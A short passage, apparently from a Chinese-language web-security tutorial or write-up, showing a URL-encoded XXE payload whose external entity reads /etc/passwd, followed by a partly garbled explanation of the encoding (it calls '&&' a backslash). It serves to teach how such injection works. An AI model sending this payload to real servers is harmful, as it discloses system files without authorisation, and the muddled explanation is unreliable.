  1.0\" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM \"file:///etc/passwd\"\
  >]><thp>黑客攻击 %26book%3B</thp>\n\n* 请注意，`%26` = `&` 和 `%3B` = `;`。我们需要对反斜杠 (`&&`)\
